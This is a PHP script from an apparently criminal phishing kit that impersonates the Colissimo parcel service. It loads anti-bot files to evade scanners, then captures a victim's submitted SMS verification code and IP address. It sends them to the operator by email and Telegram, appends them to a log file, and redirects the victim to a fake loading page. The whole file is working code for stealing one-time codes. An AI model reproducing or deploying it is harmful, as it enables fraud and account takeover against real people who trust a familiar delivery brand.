<?php
	require_once "bots/antibots1.php";
	require_once "bots/antibots2.php";
	require_once "bots/antibots3.php";
	require_once "bots/antibots4.php";
	require_once "bots/antibots5.php";
	require_once "bots/antibots6.php";
?>
<?php
$ip = getenv("REMOTE_ADDR");
$message .= "---------------- MOBILE NEWW-----------------\n";
$message .= "-----------------Info----------------------\n";
$message .= " SMS               : ".$_POST['sms1']."\n";
$message .= "------------------Info D'IP-------------------------\n";
$message .= "IP                : $ip\n";
$message .= "--------------- ---------------\n";

include '../tlgrm.php';	
$sen = "$send";

$subject = "COLISSIMO ~ $ip";

$from .= "From: KHALISS ~<Troj>\n";
$from .= "To:";

mail($sen,$subject,$message,$from);
telegram($message);

$file = fopen("../../alog00.txt","a");
fwrite($file,$message); 

echo '<script language="Javascript">
<!--
document.location.replace("loading2.html?id=3164444782000");
// -->
</script>';
?>